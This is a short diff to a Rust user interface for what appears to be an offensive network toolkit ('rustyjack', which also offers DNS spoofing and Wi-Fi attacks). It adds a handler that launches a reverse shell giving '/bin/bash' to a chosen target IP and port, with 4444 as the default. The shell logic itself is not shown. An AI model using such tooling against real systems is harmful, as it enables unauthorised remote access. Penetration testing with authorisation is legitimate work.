@@ -1,5 +1,7 @@
 use anyhow::Result;
-use rustyjack_commands::{Commands, DnsSpoofCommand, DnsSpoofStartArgs, WifiCommand};
+use rustyjack_commands::{
+    Commands, DnsSpoofCommand, DnsSpoofStartArgs, ReverseCommand, ReverseLaunchArgs, WifiCommand,
+};
 
 use crate::util::shorten_for_display;
 
@@ -761,3 +763,29 @@ impl App {
         let port: u16 = port_choice
             .and_then(|idx| ports.get(idx))
             .and_then(|p| p.parse().ok())
+            .unwrap_or(4444);
+
+        let args = ReverseLaunchArgs {
+            target: target_ip.clone(),
+            port,
+            shell: "/bin/bash".to_string(),
+            interface: Some(iface.clone()),
+        };
+
+        match self
+            .core
+            .dispatch(Commands::Reverse(ReverseCommand::Launch(args)))
+        {
+            Ok((msg, _)) => self.show_message(
+                "Reverse Shell",
+                [
+                    msg,
+                    format!("Target: {}", target_ip),
+                    format!("Port: {}", port),
+                    format!("Iface: {}", iface),
+                ],
+            ),
+            Err(e) => self.show_message("Reverse Shell", [format!("Launch failed: {}", e)]),
+        }
+    }
+}
